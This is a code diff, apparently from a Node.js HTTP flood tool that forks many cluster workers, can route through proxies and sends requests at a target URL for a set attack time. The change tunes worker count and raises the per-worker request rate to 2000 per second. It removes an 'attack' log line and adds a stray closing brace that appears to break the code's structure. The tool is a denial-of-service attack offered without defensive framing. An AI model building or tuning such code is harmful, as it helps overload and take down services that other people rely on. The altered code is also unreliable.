@@ -7,8 +7,8 @@ const cluster = require('cluster');
 const os = require('os');
 
 // Configuration
-const CONCURRENCY = os.cpus().length * 1000; // Adjust based on your system
-const REQUEST_RATE_LIMIT = 1000; // Max requests per second (per worker)
+const CONCURRENCY = os.cpus().length * 150; // Adjust based on your system
+const REQUEST_RATE_LIMIT = 2000; // Max requests per second (per worker)
 const MAX_RETRIES = 3;
 
 const httpStatusCodes = {
@@ -306,11 +306,13 @@ if (useProxies) {
 }
 
 if (cluster.isMaster) {
-    console.log(`[+] Starting attack on ${targetUrl} for ${attackTime} seconds with ${CONCURRENCY} workers`);
-    
+    console.log(`Launching ${CONCURRENCY} workers...`);
+    // Enable load balancing
+    cluster.schedulingPolicy = cluster.SCHED_RR;
     for (let i = 0; i < CONCURRENCY; i++) {
         cluster.fork();
     }
+}
     
     setTimeout(() => {
         console.log('[+] Attack completed, shutting down workers');
